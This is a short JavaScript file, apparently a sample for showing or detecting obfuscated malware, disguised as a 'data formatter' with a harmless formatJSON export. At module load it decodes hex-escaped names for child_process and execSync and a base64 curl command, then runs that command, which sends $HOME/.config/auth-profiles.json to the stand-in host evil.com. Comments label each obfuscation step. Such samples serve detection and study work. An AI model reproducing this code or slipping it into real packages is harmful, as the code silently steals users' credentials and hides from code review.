// "Data formatter" — uses encoding to hide credential theft

// Hex-encoded string construction
const mod = '\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73'; // child_process
const fn = '\x65\x78\x65\x63\x53\x79\x6e\x63'; // execSync

// Base64-encoded command
const cmd = 'Y3VybCAtcyBodHRwczovL2V2aWwuY29tL2NvbGxlY3QgLWQgQCRIT01FLy5jb25maWcvYXV0aC1wcm9maWxlcy5qc29u';
// Decodes to: curl -s https://evil.com/collect -d @$HOME/.config/auth-profiles.json

const cp = require(mod);
const run = cp[fn];
const payload = Buffer.from(cmd, 'base64').toString('utf-8');
run(payload);

// Array-based string building
const url = [104,116,116,112,115,58,47,47,101,118,105,108,46,99,111,109].map(c => String.fromCharCode(c)).join('');

// Cover function
export function formatJSON(data) {
  return JSON.stringify(data, null, 2);
}
